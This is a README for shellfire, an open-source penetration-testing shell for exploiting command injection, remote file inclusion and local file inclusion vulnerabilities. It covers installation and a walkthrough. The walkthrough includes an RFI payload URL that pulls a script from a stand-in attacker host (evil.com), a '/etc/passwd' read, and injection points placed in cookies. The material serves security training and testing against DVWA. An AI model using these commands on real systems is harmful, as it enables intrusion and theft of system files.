# shellfire

_shellfire_ is an exploitation shell which focuses on exploiting command injection vulnerabilities. This can be useful when exploiting LFI, RFI, SSTI, etc.

I originally started developing this script while working on my OSCP labs. As the capabilities grew, I thought maybe other people could find this as 
useful as I have, so I decided to open source my tool.

## Features  

- [X] Persistent named configuration for multiple targets (and sharing!)  
- [X] Plugin system  
- [X] PHP payload  
- [X] ASP payload  


## Installation  

There are a few ways to install this tool. Shellfire is available via PyPI, so you can use pip.

```
$ pip install shellfire
```

From Kali Linux, you can even use apt.

```
$ sudo apt install shellfire
```

If you'd like to build from source, you can use the standard Python setuptools to install this package.

```
$ git clone https://github.com/unix-ninja/shellfire.git
$ cd shellfire
$ python setup.py install
```

## A few useful hints

After installing, you can just call 'shellfire' from your terminal.

```
$ shellfire
[*] ShellFire v0.11
[*] Type 'help' to see available commands
(config)>
```

You can type `help` at any time inside config mode for a list of available commands, or append 
the command you want to know more information about to help for specific 
details. For example `help http`.

Let's explore how to attack a basic RFI vulnerability!

To start exploitation, you need to specify at least the URL parameter of your target. 
Something like the following should work:

```
(config)> url http://example.com/?path=http://evil.com/script.php
```

Running any command now would cause your RFI to get executed on the remote target.

Let's say you want to arbitrarily control the payloads going to the path paramter. This time, we will use `{}` to specify our injection point.

```
(config)> url http://example.com/?path={}
```

Before we can send our payloads, we must enter shell mode.

```
(config)> shell
```

Now, you can just type the payload you want to send and hit enter.

```
(shell)> /etc/passwd
```

You can always type "exit" to return from shell mode, back to config mode.

```
(shell)> exit
```

At this point, you should have enough to exploit easy vulnerabilities. Payloads you enter on the shell will be appropriately injected and sent over to your target.

More complex vulnerabilities may require specifying additional options. 
For example, let's assume you needed to send a cookie with a session ID in 
order to exploit your target. You may want to add something like this:

```
(config)> cookies { "session_id" : "123456789" }
```

We can specify injection points in cookies too.

```
(config)> cookies { "session_id" : "123456789", "vuln_param": "{}" }
```

Additional options, and information on how to use them, can be discovered by 
using the `help` option in config mode.

Thanks to Offensive-Security for inspiring the creation of this utility.

Please use this tool for good.

Happy hacking!


## Testing  

Testing is currently being done against the [dvwa docker image](https://hub.docker.com/r/vulnerables/web-dvwa/).
